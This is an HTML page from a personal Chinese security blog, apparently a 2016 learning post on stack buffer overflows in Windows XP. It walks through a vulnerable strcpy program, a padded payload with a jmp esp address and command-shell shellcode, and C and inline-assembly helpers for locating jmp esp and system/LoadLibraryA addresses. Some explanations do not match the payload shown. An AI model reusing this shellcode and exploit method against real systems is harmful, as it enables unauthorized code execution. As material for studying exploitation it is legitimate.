@@ -1,0 +1,961 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="windows,xp,overflow," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows XP 溢出学习">
+<meta property="og:url" content="http://orleven.com/2016/11/10/windows-overflow-xp/index.html">
+<meta property="og:site_name" content="Orleven Blog">
+<meta property="og:description" content="概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp1.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp4.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp5.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp6.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp7.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp8.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp9.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp10.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp11.png">
+<meta property="og:image" content="http://orleven.com/images/windows-overflow-xp12.png">
+<meta property="og:updated_time" content="2017-03-14T15:48:17.405Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows XP 溢出学习">
+<meta name="twitter:description" content="概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。">
+<meta name="twitter:image" content="http://orleven.com/images/windows-overflow-xp1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://orleven.com/2016/11/10/windows-overflow-xp/"/>
+
+
+
+
+
+  <title> Windows XP 溢出学习 | Orleven Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Orleven Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Orleven Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://orleven.com/2016/11/10/windows-overflow-xp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Orleven">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/orleven.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Orleven Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Windows XP 溢出学习
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-10T10:12:22Z">
+                2016-11-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/overflow/" itemprop="url" rel="index">
+                    <span itemprop="name">overflow</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。 </p>
+<a id="more"></a>
+<h1 id="目标代码"><a href="#目标代码" class="headerlink" title="目标代码"></a>目标代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> name[] = <span class="string">"abcdef"</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> output[<span class="number">8</span>];</div><div class="line">    <span class="built_in">strcpy</span>(output, name);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>&amp;&amp;output[i];i++) </div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\\0x%x"</span>,output[i]);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>它的运行时这样的：</p>
+<p><img src="/images/windows-overflow-xp1.png" alt="windows-overflow-xp1.png"></p>
+<p>假如name[] 的字符串变长 ，例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> name[] = <span class="string">"abcdefghijklmnopqrst"</span>;</div><div class="line">``` </div><div class="line"></div><div class="line">就会发生溢出，vc6<span class="number">.0</span> 就会报错：</div><div class="line"></div><div class="line">![windows-overflow-xp2.png](/images/windows-overflow-xp2.png)</div><div class="line"></div><div class="line">可见后面的值溢出，覆盖了之后的值。</div><div class="line"></div><div class="line">如果name[]的值是这样：</div><div class="line"></div><div class="line">``` c</div><div class="line"><span class="keyword">char</span> name[] = <span class="string">"\x41\x41\x41\x41"</span>  </div><div class="line"><span class="string">"\x41\x41\x41\x41"</span>  </div><div class="line"><span class="string">"\x41\x41\x41\x41"</span>  </div><div class="line"><span class="comment">//以上是覆盖掉name的8个字节以及epb个字节</span></div><div class="line"></div><div class="line"><span class="string">"\x12\x45\xfa\x7f"</span>  </div><div class="line"><span class="comment">//以上是jmp esp的地址 sp3中文版的值</span></div><div class="line">                </div><div class="line"><span class="string">"\x55\x8B\xEC\x33\xC0\x50\x50\x50"</span></div><div class="line"><span class="string">"\xC6\x45\xF4\x4D"</span></div><div class="line"><span class="string">"\xC6\x45\xF5\x53"</span>  </div><div class="line"><span class="string">"\xC6\x45\xF6\x56"</span>  </div><div class="line"><span class="string">"\xC6\x45\xF7\x43"</span></div><div class="line"><span class="string">"\xC6\x45\xF8\x52"</span></div><div class="line"><span class="string">"\xC6\x45\xF9\x54"</span></div><div class="line"><span class="string">"\xC6\x45\xFA\x2E"</span></div><div class="line"><span class="string">"\xC6\x45\xFB\x44"</span></div><div class="line"><span class="string">"\xC6\x45\xFC\x4C"</span></div><div class="line"><span class="string">"\xC6\x45\xFD\x4C"</span></div><div class="line"><span class="string">"\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2"</span></div><div class="line"><span class="string">"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D"</span></div><div class="line"><span class="string">"\x89\x45\xF4\xB8\x61\x6E\x64\x2E"</span>  </div><div class="line"><span class="string">"\x89\x45\xF8\xB8\x63\x6F\x6D\x22"</span></div><div class="line"><span class="string">"\x89\x45\xFC\x33\xD2\x88\x55\xFF"</span></div><div class="line"><span class="string">"\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0"</span>;</div><div class="line"><span class="comment">//以上是ShellCode</span></div><div class="line">``</div><div class="line">则会调用cmd命令</div><div class="line"></div><div class="line">![windows-overflow-xp3.png](/images/windows-overflow-xp3.png)</div><div class="line"></div><div class="line">至于jmp  esp的地址是怎么来的，一般网上都有，或者。</div><div class="line">用如下程序寻找</div><div class="line"></div><div class="line">``` c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;   </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;   </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">"user32.dll"</span>  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line">&#123;           </div><div class="line">    BYTE *ptr;  </div><div class="line">    <span class="keyword">int</span> position,address;       </div><div class="line">    HINSTANCE handle;  </div><div class="line">    BOOL done_flag = FALSE;     </div><div class="line">    handle = LoadLibrary(DLL_NAME);  </div><div class="line">    <span class="keyword">if</span>(!handle)          </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"load dll error!"</span>);                   </div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);  </div><div class="line">    &#125;           </div><div class="line">    ptr = (BYTE*)handle;  </div><div class="line">    <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)  </div><div class="line">    &#123;                   </div><div class="line">        <span class="keyword">try</span>  </div><div class="line">        &#123;                           </div><div class="line">            <span class="keyword">if</span>(ptr[position]==<span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>]==<span class="number">0xE4</span>)  </div><div class="line">            &#123;                                   </div><div class="line">                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;           </div><div class="line">                <span class="built_in">printf</span>(<span class="string">"OPCODE found at 0x%x\n"</span>, address);      </div><div class="line">            &#125;  </div><div class="line">               </div><div class="line">        &#125;                   </div><div class="line">        <span class="keyword">catch</span>(...)  </div><div class="line">        &#123;                           </div><div class="line">            <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;       </div><div class="line">            <span class="built_in">printf</span>(<span class="string">"END OF 0x%x\n"</span>, address);                        </div><div class="line">            done_flag = <span class="literal">true</span>;  </div><div class="line">        &#125;         </div><div class="line">    &#125;  </div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/images/windows-overflow-xp4.png" alt="windows-overflow-xp4.png"></p>
+<p>上述程序中是在user32.dll中寻找jmp esp的机器码FFE4，会查找到很多的结果，选择其中的一个就可以。<br>这里需要特别说明的是，不同的计算机不同的操作系统版本，所找到的jmp esp的地址可能会不一样，就是说jmp esp的地址往往并不是通用的。<br>当然，也会有几个地址是跨版本的，这个在这里不讨论。<br>这次我们选择其中的一个地址——0x7e490b40。由于是小 端显示，所以应当在“OPQR”的位置反向书写，即400b497e。<br>当然这里不能够直接用类似于记事本这样的软件进行编辑，而是需要用十六进制代码编辑 器操作。</p>
+<p>至于shellcode如何得出，请继续往下看<br>比如下面这个程序就可以完成开DOS窗口的功能，大家详细看下注释：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winbase.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;     <span class="comment">//定义函数指针</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    HINSTANCE LibHandle;</div><div class="line">    MYPROC ProcAdd;</div><div class="line">    LibHandle = LoadLibrary(“msvcrt”);</div><div class="line">    ProcAdd = (MYPROC) GetProcAddress(LibHandle, <span class="string">"system"</span>); <span class="comment">//查找System函数地址</span></div><div class="line">    (ProcAdd) (<span class="string">"command.com"</span>);     <span class="comment">//其实就是执行System(“command.com”)</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序中用GetProcAddress函数获得System的真实地址，但地址究竟是多少，如何查看呢？<br>如下图断点，然后调试</p>
+<p><img src="/images/windows-overflow-xp5.png" alt="windows-overflow-xp5.png"></p>
+<p>按alt + 8 以及alt+ 5，出现如下界面</p>
+<p><img src="/images/windows-overflow-xp6.png" alt="windows-overflow-xp6.png"></p>
+<p>按F10 运行到如下位置</p>
+<p><img src="/images/windows-overflow-xp7.png" alt="windows-overflow-xp7.png"></p>
+<p>EAX变为77c293c7，说明在我的机器上System( )函数的地址是0x77c293c7。</p>
+<p>为什么EAX就是System( )函数的地址呢？那是因为函数执行的返回值，在汇编下通常是放在EAX中的，这算是计算机系统的约定吧，所以GetProcAddress（”System”）的返回值（System函数的地址），就在EAX中，为0x77c293c7。</p>
+<p>如下是调用cmd代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    LoadLibrary(<span class="string">"msvcrt.dll"</span>);</div><div class="line">    system(<span class="string">"command.com"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先来验证一下，在VC中可以用__asm关键字插入汇编，我们把System(“Command.com”)用我们写的汇编替换，LoadLibrary先不动，然后执行，成功！弹出了我们想要的DOS窗口。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    LoadLibrary(<span class="string">"msvcrt.dll"</span>);</div><div class="line">    <span class="comment">//system("command.com");</span></div><div class="line">    _asm&#123;</div><div class="line">        push ebp;</div><div class="line">        mov ebp, esp;</div><div class="line">        xor edi,edi;</div><div class="line">        push edi;     <span class="comment">//申请4字节空间</span></div><div class="line">        push edi;    <span class="comment">//申请4字节空间</span></div><div class="line">        push edi;    <span class="comment">//申请4字节空间</span></div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ch],<span class="number">63</span>h;     <span class="comment">//c</span></div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>bh],<span class="number">6f</span>h;     <span class="comment">//o</span></div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ah],<span class="number">6</span>dh;     <span class="comment">//m</span></div><div class="line">        mov byte ptr[ebp<span class="number">-09</span>h],<span class="number">6</span>dh;     <span class="comment">//m</span></div><div class="line">        mov byte ptr[ebp<span class="number">-08</span>h],<span class="number">61</span>h;    <span class="comment">//a</span></div><div class="line">        mov byte ptr[ebp<span class="number">-07</span>h],<span class="number">6</span>eh;    <span class="comment">//n</span></div><div class="line">        mov byte ptr[ebp<span class="number">-06</span>h],<span class="number">64</span>h;    <span class="comment">//d</span></div><div class="line">        mov byte ptr[ebp<span class="number">-05</span>h],<span class="number">2</span>eh;   <span class="comment">//.</span></div><div class="line">        mov byte ptr[ebp<span class="number">-04</span>h],<span class="number">63</span>h;    <span class="comment">//c</span></div><div class="line">        mov byte ptr[ebp<span class="number">-03</span>h],<span class="number">6f</span>h;    <span class="comment">//o </span></div><div class="line">        mov byte ptr[ebp<span class="number">-02</span>h],<span class="number">6</span>dh;   <span class="comment">//m</span></div><div class="line">        lea eax, [ebp<span class="number">-0</span>ch];</div><div class="line">        push eax;                <span class="comment">//command.com串地址作为参数入栈</span></div><div class="line">        mov eax, <span class="number">0x77c293c7</span>;</div><div class="line">        call eax;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/images/windows-overflow-xp8.png" alt="windows-overflow-xp8.png"></p>
+<p>同样的道理，LoadLibrary(“msvcrt.dll”)也仿照上面改成汇编，注意LoadLibrary可以用如下程序查找。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;   </div><div class="line">        HINSTANCE LibHandle;</div><div class="line">        MYPROC ProcAdd;</div><div class="line">        LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"msvcrt LibHandle = //x%x\n"</span>, LibHandle);</div><div class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">"LoadLibraryA"</span>);   </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"LoadLibrary = //x%x\n"</span>, ProcAdd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/images/windows-overflow-xp9.png" alt="windows-overflow-xp9.png"></p>
+<p>可以看到地址为0x7c801d7b</p>
+<p>把两段汇编合起来，将其编译、链接、执行，也成功了！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">//LoadLibrary("msvcrt.dll");</span></div><div class="line">    _asm&#123;</div><div class="line">        push ebp;</div><div class="line">        mov ebp,esp;</div><div class="line">        xor eax,eax;</div><div class="line">        push eax;</div><div class="line">        push eax;</div><div class="line">        push eax;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ch],<span class="number">6</span>dh;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>bh],<span class="number">73</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ah],<span class="number">76</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-09</span>h],<span class="number">63</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-08</span>h],<span class="number">72</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-07</span>h],<span class="number">74</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-06</span>h],<span class="number">2</span>eh;</div><div class="line">        mov byte ptr[ebp<span class="number">-05</span>h],<span class="number">64</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-04</span>h],<span class="number">6</span>ch;</div><div class="line">        mov byte ptr[ebp<span class="number">-03</span>h],<span class="number">6</span>ch;</div><div class="line">        lea eax,[ebp<span class="number">-0</span>ch];</div><div class="line">        push eax;</div><div class="line">        mov edx, <span class="number">0x7c801d7b</span>;</div><div class="line">        call edx;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//system("command.com");</span></div><div class="line">    _asm&#123;</div><div class="line">        push ebp;</div><div class="line">        mov ebp, esp;</div><div class="line">        xor edi,edi;</div><div class="line">        push edi;   </div><div class="line">        push edi;</div><div class="line">        push edi;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ch],<span class="number">63</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>bh],<span class="number">6f</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-0</span>ah],<span class="number">6</span>dh;</div><div class="line">        mov byte ptr[ebp<span class="number">-09</span>h],<span class="number">6</span>dh;</div><div class="line">        mov byte ptr[ebp<span class="number">-08</span>h],<span class="number">61</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-07</span>h],<span class="number">6</span>eh;</div><div class="line">        mov byte ptr[ebp<span class="number">-06</span>h],<span class="number">64</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-05</span>h],<span class="number">2</span>eh;</div><div class="line">        mov byte ptr[ebp<span class="number">-04</span>h],<span class="number">63</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-03</span>h],<span class="number">6f</span>h;</div><div class="line">        mov byte ptr[ebp<span class="number">-02</span>h],<span class="number">6</span>dh;</div><div class="line">        lea eax, [ebp<span class="number">-0</span>ch];</div><div class="line">        push eax;</div><div class="line">        mov eax, <span class="number">0x77c293c7</span>;</div><div class="line">        call eax;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/images/windows-overflow-xp10.png" alt="windows-overflow-xp10.png"></p>
